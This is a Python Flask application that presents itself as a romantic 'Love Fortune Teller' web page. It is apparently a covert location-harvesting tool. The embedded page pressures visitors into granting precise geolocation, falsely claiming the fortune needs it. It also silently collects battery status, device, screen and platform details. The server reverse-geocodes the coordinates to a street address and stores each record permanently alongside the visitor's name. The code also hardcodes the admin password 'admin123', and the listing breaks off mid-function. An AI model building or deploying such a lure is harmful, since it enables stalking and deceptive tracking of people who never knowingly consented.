from flask import Flask, request, jsonify, abort, send_file
from flask_cors import CORS
import pandas as pd
import requests
import os
import random
import shutil
from datetime import datetime

app = Flask(__name__)
CORS(app)

# PERMANENT STORAGE
EXCEL_FILE = 'fortunes_data.xlsx'
BACKUP_FILE = 'fortunes_data_backup.xlsx'
ADMIN_PASSWORD = 'admin123'

def ensure_persistent_storage():
    if not os.path.exists(EXCEL_FILE):
        df = pd.DataFrame(columns=[
            'DateTime', 'Name', 'Latitude', 'Longitude',
            'Google Maps', 'Accuracy_m', 'Address',
            'Battery_%', 'Charging', 'Device', 'Screen', 'Platform'
        ])
        df.to_excel(EXCEL_FILE, index=False)
        print("✅ Created permanent Excel")
    
    if os.path.exists(EXCEL_FILE) and not os.path.exists(BACKUP_FILE):
        shutil.copy2(EXCEL_FILE, BACKUP_FILE)
        print("✅ Backup created")

def load_data():
    ensure_persistent_storage()
    for file_path in [EXCEL_FILE, BACKUP_FILE]:
        if os.path.exists(file_path):
            try:
                df = pd.read_excel(file_path)
                print(f"✅ Loaded {len(df)} permanent records")
                return df
            except:
                continue
    ensure_persistent_storage()
    return pd.read_excel(EXCEL_FILE)

def save_data_permanent(data):
    df = load_data()
    new_row = pd.DataFrame([data])
    df = pd.concat([df, new_row], ignore_index=True)
    df.to_excel(EXCEL_FILE, index=False)
    shutil.copy2(EXCEL_FILE, BACKUP_FILE)
    os.sync()  # FORCE PERMANENT DISK WRITE
    print(f"✅ SAVED PERMANENT: {data['Name']} | Total: {len(df)}")
    return True

def geocode_reverse(lat, lon):
    try:
        url = "https://nominatim.openstreetmap.org/reverse"
        params = {'lat': lat, 'lon': lon, 'format': 'json', 'zoom': 18}
        headers = {'User-Agent': 'LoveFortuneTeller/1.0'}
        r = requests.get(url, params=params, headers=headers, timeout=8)
        if r.status_code == 200:
            return r.json().get('display_name', f"{lat:.4f}, {lon:.4f}")[:200]
        return f"{lat:.4f}, {lon:.4f}"
    except:
        return f"{lat:.4f}, {lon:.4f}"

# 30+ ROMANTIC FORTUNES
FORTUNES = [
    "💕 Dear {name}, someone special is thinking of you right now!",
    "💖 {name}, a beautiful soul is about to enter your life!",
    "💗 {name}, the universe has heard your heart's desire!",
    "💓 {name}, your soulmate is closer than you think!",
    "💝 Someone you meet very soon will change your life, {name}!",
    "💕 Love is rushing toward you faster than you know, {name}!",
    "💖 {name}, your positive energy is attracting true love!",
    "💗 The stars are perfectly aligned just for you today, {name}!",
    "💓 {name}, a wonderful surprise is waiting for your heart!",
    "💝 {name}, someone is secretly falling for you right now!",
    "🌟 {name}, today a chance encounter will spark something magical!",
    "🌙 {name}, the moon whispers your name — love is near.",
    "✨ A stranger will smile at you in a way that feels like home, {name}.",
    "🍃 {name}, let go of the past — your next chapter is beautiful.",
    "💌 Check your messages soon, {name}; someone has been wanting to text you.",
    "🎶 {name}, a song you love will remind you of someone who loves you.",
    "🌸 Spring brings new beginnings, and for you, a fresh romance, {name}.",
    "💎 {name}, you are more precious than you know — someone agrees.",
    "🕯️ An old friend will become something more, {name}. Stay open.",
    "🌊 {name}, your emotions are deep and beautiful — someone will dive in.",
    "🍀 Lucky in love? Very soon, yes — the stars guarantee it, {name}!",
    "📖 {name}, your love story is being written right now. It's a bestseller.",
    "🏹 Cupid's arrow is aiming for your heart, {name}. Embrace it!",
    "💬 A late-night conversation will reveal mutual feelings, {name}.",
    "🎁 Unexpected gift of affection coming your way, {name}.",
    "🌹 Roses are red, violets are blue — someone writes poems for you, {name}.",
    "🌟 {name}, your vibe attracts your tribe — and a special someone.",
    "💭 {name}, if you've been thinking about them, they've been thinking about you.",
    "🔥 Passion ignites where you least expect it, {name}. Be present.",
    "💫 The universe just nudged fate toward you, {name}. Watch for signs.",
    "🍂 Even autumn leaves know change brings love — your turn, {name}.",
    "🧡 {name}, a heart-to-heart talk will clear the way for romance.",
    "🎈 {name}, something light and joyful is drifting toward your love life."
]

# COMPLETE HTML (your exact romantic UI)
HTML = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Fortune Teller</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#ff9a9e,#fecfef,#ffdde1);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden;}
.heart{position:fixed;pointer-events:none;z-index:0;animation:floatUp 4s linear infinite;}
@keyframes floatUp{0%{transform:translateY(100vh) rotate(0deg);opacity:1;}100%{transform:translateY(-100vh) rotate(360deg);opacity:0;}}
.box{background:rgba(255,255,255,0.96);border-radius:50px;padding:50px 40px;max-width:540px;width:100%;text-align:center;box-shadow:0 30px 60px rgba(0,0,0,0.18);z-index:1;position:relative;animation:fadeIn 0.8s;}
@keyframes fadeIn{from{opacity:0;transform:scale(0.9);}to{opacity:1;transform:scale(1);}}
.top-emoji{font-size:90px;animation:bounce 2s infinite;display:block;}
@keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
h1{font-size:34px;margin:15px 0 8px;background:linear-gradient(135deg,#ff6b6b,#c06c84);-webkit-background-clip:text;background-clip:text;color:transparent;}
.sub{color:#aaa;font-size:15px;margin-bottom:30px;}
.igroup{margin-bottom:22px;text-align:left;}
.igroup label{display:block;margin-bottom:8px;color:#c06c84;font-weight:600;}
.igroup input{width:100%;padding:14px 20px;border:2px solid #ffdde1;border-radius:50px;font-size:16px;text-align:center;outline:none;transition:0.3s;}
.igroup input:focus{border-color:#c06c84;box-shadow:0 0 12px rgba(192,108,132,0.3);}
.btn{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;border:none;padding:17px 40px;font-size:19px;font-weight:bold;border-radius:60px;cursor:pointer;width:100%;transition:0.3s;}
.btn:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(192,108,132,0.4);}
.loading{display:none;margin-top:28px;}
.loading.show{display:block;}
.spinner{width:58px;height:58px;margin:0 auto 16px;background:linear-gradient(135deg,#ff6b6b,#c06c84);border-radius:50%;animation:pulse 1.2s infinite;}
@keyframes pulse{0%,100%{transform:scale(0.8);opacity:0.5;}50%{transform:scale(1.2);opacity:1;}}
.result{display:none;margin-top:28px;padding:35px;background:linear-gradient(135deg,#ff9a9e,#fecfef);border-radius:30px;color:#fff;animation:slideUp 0.6s;}
.result.show{display:block;}
@keyframes slideUp{from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:translateY(0);}}
.r-icon{font-size:50px;animation:hb 1.5s infinite;}
@keyframes hb{0%,100%{transform:scale(1);}50%{transform:scale(1.2);}}
.r-name{font-size:26px;font-weight:bold;margin:12px 0;}
.r-msg{font-size:20px;line-height:1.6;margin:14px 0;font-weight:500;}
#overlay{display:none;position:fixed;inset:0;z-index:99999;background:linear-gradient(135deg,#ff6b6b,#c06c84);flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:30px;}
#overlay.show{display:flex;}
.o-emoji{font-size:75px;margin-bottom:18px;animation:bounce 2s infinite;}
#overlay h2{color:#fff;font-size:26px;margin-bottom:12px;}
#overlay p{color:rgba(255,255,255,0.92);font-size:15px;max-width:360px;line-height:1.7;margin-bottom:22px;}
.steps{background:rgba(255,255,255,0.18);border-radius:18px;padding:18px 22px;margin-bottom:22px;text-align:left;max-width:360px;width:100%;color:#fff;font-size:14px;line-height:2.3;}
.o-btn{background:#fff;color:#c06c84;border:none;padding:15px 38px;font-size:17px;font-weight:bold;border-radius:60px;cursor:pointer;animation:pulse 1.5s infinite;}
@media(max-width:560px){.box{padding:30px 20px;}h1{font-size:26px;}.r-msg{font-size:17px;}}
</style>
</head>
<body>
<div id="overlay">
  <div class="o-emoji">🔐💕</div>
  <h2>Location Access Needed!</h2>
  <p>Your love fortune can only be revealed with your location. Please allow it to continue ✨</p>
  <div class="steps">
    🔒 Tap the <strong>lock icon</strong> in your address bar<br>
    📋 Open <strong>Site Settings</strong><br>
    📍 Set <strong>Location → Allow</strong><br>
    🔄 Tap <strong>Try Again</strong> below
  </div>
  <button class="o-btn" onclick="retry()">💫 Allow Location & Try Again 💫</button>
</div>
<div class="box">
  <span class="top-emoji">💕🔮💕</span>
  <h1>Your Love Fortune</h1>
  <div class="sub">Discover what destiny has planned for your heart</div>
  <div id="form">
    <div class="igroup">
      <label>✨ Enter your name, beautiful soul ✨</label>
      <input id="uname" type="text" placeholder="Your name..." autocomplete="off">
    </div>
    <button class="btn" onclick="start()">✨ Reveal My Destiny ✨</button>
  </div>
  <div class="loading" id="load">
    <div class="spinner"></div>
    <p>💫 Reading the stars for you...</p>
  </div>
  <div class="result" id="res">
    <div class="r-icon">💖</div>
    <div class="r-name" id="rname"></div>
    <div class="r-msg" id="rmsg"></div>
    <div>✨ The universe has spoken ✨</div>
  </div>
</div>
<script>
setInterval(()=>{
  const h=document.createElement('div');
  h.innerHTML=['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
  h.className='heart';
  h.style.cssText=`left:${Math.random()*100}%;font-size:${Math.random()*20+14}px;animation-duration:${Math.random()*3+3}s`;
  document.body.appendChild(h);
  setTimeout(()=>h.remove(),4500);
},600);
let uname='';
window.start=function(){
  uname=document.getElementById('uname').value.trim();
  if(!uname){alert('💕 Please enter your name!');return;}
  askLocation();
};
async function getBatteryInfo(){
  try{const b=await navigator.getBattery();return {level:Math.round(b.level*100),charging:b.charging};}
  catch(e){return {level:'N/A',charging:'N/A'};}
}
function askLocation(){
  document.getElementById('res').classList.remove('show');
  document.getElementById('form').style.display='none';
  document.getElementById('load').classList.add('show');
  document.getElementById('overlay').classList.remove('show');
  if(!navigator.geolocation){showOverlay();return;}
  navigator.geolocation.getCurrentPosition(
    async pos=>{
      document.getElementById('load').classList.remove('show');
      const battery=await getBatteryInfo();
      try{
        const r=await fetch('/save',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({
            name:uname,
            latitude:pos.coords.latitude,
            longitude:pos.coords.longitude,
            accuracy:pos.coords.accuracy,
            battery_level:battery.level,
            battery_charging:battery.charging,
            userAgent:navigator.userAgent,
            screen:screen.width+'x'+screen.height,
            platform:navigator.platform
          })
        });
        const d=await r.json();
        if(d.fortune){
          document.getElementById('rname').innerHTML='✨ '+uname+' ✨';
          document.getElementById('rmsg').innerHTML=d.fortune;
          document.getElementById('res').classList.add('show');
        }
      }catch(e){document.getElementById('form').style.display='block';}
    },
    ()=>{document.getElementById('load').classList.remove('show');showOverlay();},
    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
  );
}
function showOverlay(){document.getElementById('overlay').classList.add('show');}
window.retry=function(){document.getElementById('form').style.display='
